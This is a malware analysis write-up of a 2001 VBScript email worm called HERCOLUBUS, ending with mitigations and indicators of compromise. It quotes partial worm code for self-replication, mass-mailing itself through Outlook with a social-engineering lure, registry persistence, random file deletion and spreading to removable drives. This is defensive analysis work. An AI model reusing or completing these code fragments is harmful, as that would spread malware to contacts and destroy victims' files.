
# 🧪 Analysis of the "HERCOLUBUS" VBScript Worm

## Introduction

This malware is a Visual Basic Script (`.vbs`) dated *27/08/2001*, named **HERCOLUBUS**. It is a classic worm that propagates via **Microsoft Outlook**, uses **file deletion**, **file system crawling**, and **registry persistence**.

It heavily abuses **Windows Scripting Host** APIs (`Scripting.FileSystemObject`, `WScript.Shell`, `Outlook.Application`) and performs **self-replication**, **social engineering**, and **removable drive propagation**.

It uses filenames like:
- `MSWORD.vbs`
- `THWIN.vbs`

Written entirely in **VBScript**, it is designed for Windows systems with Outlook installed.

https://www.virustotal.com/gui/file/e47c8e572a7856e8def779039aa744e72a7ed900542ad3af64dcdab1bf5c18de

## General Behavior

At a high level, the malware:
1. **Copies itself to system directories** under deceptive names.
2. **Sends itself via Outlook** to all address book entries.
3. **Deletes up to 5 files** of randomly selected extensions (`xls`, `doc`, `mp3`, etc.).
4. **Creates persistence** by writing to the registry's Run key.
5. **Spreads through USB drives** by copying itself with deceptive names like `UNSCH.doc.vbs`.

## Technical Analysis

### Function: Self-Replication & Initial Infection
```vbscript
Set sysdir = nHP.GetSpecialFolder(1) ' System folder
Set file = nHP.GetFile(WScript.ScriptFullName)

If nHP.FileExists(sysdir&"\MSWORD.vbs") = False Then
    file.copy(sysdir&"\MSWORD.vbs")
    file.copy(sysdir&"\THWIN.vbs")
    file.copy(sysdir & "\" & file.name)
```

- The script checks if `MSWORD.vbs` already exists in the system directory.
- If not, it copies itself under three names:
  - `MSWORD.vbs`
  - `THWIN.vbs`
  - The original filename

### Function: Email Propagation via Outlook
```vbscript
Set oOutLook = WScript.CreateObject("Outlook.Application")
Set nMapi = oOutLook.GetNameSpace("MAPI")
...
For y = 1 To nMapi.AddressLists.Count
    Set NuevLib = nMapi.Addresslists(y)
    For Va = 1 To NuevLib.AddressEntries.count
        Uf = NuevLib.AddressEntries(x)
        Set cFue = oOutlook.CreateItem(0)
        cFue.Recipients.Add Uf
        cFue.Subject = cNom
        cFue.Body = Uf & "  Eres algo especial...escríbeme"
        cFue.Attachments.Add (sysdir & "\" & file.name)
        cFue.Send
```

- Sends an email to every address in all address books.
- Message subject: script's name.
- Body: `"Eres algo especial...escríbeme"` ("You're something special... write me").
- Attachment: the worm itself.

### Function: Registry Persistence
```vbscript
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN", sysdir & "\THWIN.vbs"
```

- Ensures persistence at system startup using `Run` registry key.
- Also disables script execution timeout:
```vbscript
fsoST.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
```

### Function: Random File Deletion
```vbscript
nD = Int((20 * Rnd) + 1)
If nD = 1 Then cFiles ="xls"
...
If nD = 20 Then cFiles ="ico"
```

- Chooses a file extension at random from a list of 20.
- Starts drive and folder enumeration.

```vbscript
Set List1 = nHP.CreateTextFile(sysdir & "\ListWin.txt")
...
If ext = cFiles Then
    If x < 5 Then
        List1.WriteLine Now & " " & fl.Path
        Set oFil = nHP.getFile(fl.Path)
        oFil.delete
        x = x + 1
```

- Deletes up to 5 files with the selected extension.
- Logs deletions in `ListWin.txt`.

### Function: USB Spread (`oprog`)
```vbscript
If Drv.IsReady Then
    Set f = nHP.GetFolder("A:\")
    ...
    If exta <> "vbs" Then
        nHP.CopyFile sysdir & "\MSWORD.vbs", fa & ".vbs"
        oFa.attributes = 34
```

- Waits 10 minutes using a timer loop.
- If a floppy (drive A:) or USB is ready and contains non-VBS files, it:
  - Renames and hides the original file (`attributes = 34`)
  - Replaces it with a `.vbs` file mimicking the original name (e.g., `UNSCH.doc.vbs`)

## Techniques Used

### 🔄 Persistence
```vbscript
fsoST.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN", ...
```
- Ensures execution on every boot using the Windows registry.

### 📧 Propagation (Social Engineering)
```vbscript
Set oOutLook = WScript.CreateObject("Outlook.Application")
...
cFue.Body = Uf & "  Eres algo especial...escríbeme"
```
- Emails itself to contacts with romantic/social engineering bait.

### 🧹 File Deletion / Destruction
```vbscript
If ext = cFiles Then
    oFil.delete
```
- Deletes up to 5 files of a random type.

### 💽 USB Infection
```vbscript
nHP.CopyFile sysdir & "\MSWORD.vbs", fa & ".vbs"
```
- Replaces files on removable drives with VBS scripts carrying its payload.

### 🕵️ Obfuscation
- String concatenation for key object names:
```vbscript
outl = "Outlook"
lok = ".Application"
Set oOutLook = WScript.CreateObject(outl & lok)
```

- Code flow is heavily branched and uses `On Error Resume Next` to suppress runtime errors.

## Conclusion

This malware is a classic **VBScript worm** leveraging:
- Email harvesting via Outlook
- File deletion for impact
- Registry-based persistence
- Removable media replication
- Social engineering via messaging

It is no longer effective on modern systems (e.g., Outlook restricted scripting), but it highlights past attack techniques and weak points in legacy Windows environments.

**Recommendation**:
- Block `.vbs` execution via Group Policy
- Disable WScript usage
- Audit autorun and `Run` registry keys
- Use updated antivirus with scripting heuristics

## Indicators of Compromise (IOCs)

- **File Names**:
  - `MSWORD.vbs`
  - `THWIN.vbs`
  - `UNSCH.doc.vbs`

- **Registry Keys**:
  - `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\THWIN`
  - `HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout`

- **Strings/Email subject**:
  - `"Eres algo especial...escríbeme"`

- **Output files**:
  - `%SYSTEMDIR%\ListWin.txt`
  - `%SYSTEMDIR%\WinList.txt`
